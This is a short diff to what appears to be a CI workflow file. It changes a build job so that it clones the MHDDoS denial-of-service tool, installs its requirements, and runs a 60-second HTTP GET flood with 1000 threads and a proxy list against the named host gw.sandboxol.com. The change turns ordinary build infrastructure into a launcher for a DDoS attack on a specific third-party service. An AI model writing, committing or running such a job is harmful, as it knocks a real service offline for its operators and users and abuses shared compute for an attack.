@@ -8,5 +8,4 @@ jobs:
           git clone https://github.com/MatrixTM/MHDDoS.git
           cd MHDDoS
           pip install -r requirements.txt
-          python --version
-          python start.py
+          python start.py GET http://gw.sandboxol.com/server-time 0 1000 all.txt 1000 60 true
